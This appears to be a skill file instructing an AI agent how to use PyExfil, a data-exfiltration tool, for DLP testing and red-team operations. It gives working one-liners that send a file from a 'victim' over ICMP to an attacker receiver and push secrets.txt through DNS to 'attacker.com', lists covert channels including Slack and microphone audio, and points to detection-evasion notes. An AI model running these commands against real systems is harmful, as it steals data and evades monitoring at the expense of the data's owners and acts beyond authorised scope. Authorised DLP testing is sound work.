---
name: pyexfil
description: "Multi-channel data exfiltration tool supporting 20+ covert channels (ICMP, DNS, HTTPS, SMTP, Slack, QUIC). Use when testing DLP controls or exfiltrating data through unconventional protocols."
license: MIT
compatibility: "Python 3; pip install pyexfil; Linux/macOS; github.com/ytisf/PyExfil"
metadata:
  author: AeonDave
  version: "1.0"
---

# PyExfil

Multi-channel exfiltration — 20+ covert channels for DLP testing and red-team ops.

## Quick Start

```bash
pip install pyexfil

# ICMP exfil — sender (victim)
python -c "from pyexfil.network.ICMP.icmp_exfil import Send; Send('192.168.1.100', open('file.zip','rb').read())"

# ICMP receiver (attacker)
python -c "from pyexfil.network.ICMP.icmp_exfil import Receive; Receive('0.0.0.0', 'out.zip')"
```

## Exfil Channels

| Channel | Module path |
|---------|-------------|
| ICMP | `network.ICMP` |
| DNS | `network.DNS` |
| HTTPS POST | `network.HTTPS` |
| SMTP | `network.SMTP_email` |
| Slack | `application.Slack` |
| FTP STOR | `network.FTP` |
| NTP | `network.NTP` |
| BGP | `network.BGP` |
| QUIC | `network.QUIC` |
| audio (microphone) | `physical.audio` |

## Common Workflows

**DNS exfil:**
```python
from pyexfil.network.DNS.dns_exfil import Send
Send(nameserver='attacker.com', data=open('secrets.txt','rb').read())
```

**Test all channels systematically:**
```bash
# Use individual module scripts in pyexfil/network/
python pyexfil/network/ICMP/icmp_exfil.py --help
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Channel setup and detection evasion notes |
